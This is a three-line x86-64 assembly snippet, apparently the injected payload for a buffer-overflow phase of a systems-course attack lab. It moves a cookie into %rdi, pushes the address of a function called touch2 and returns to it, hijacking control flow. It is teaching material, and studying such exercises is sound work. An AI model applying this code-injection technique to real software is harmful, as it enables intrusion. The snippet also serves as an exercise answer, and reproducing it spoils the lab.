	mov $0x55674418,%rdi /* mov the cookie into place */
	push $0x4019e9	     /* push the ret address of touch2 */
	ret		     /* return to that address that was pushed on the stack */
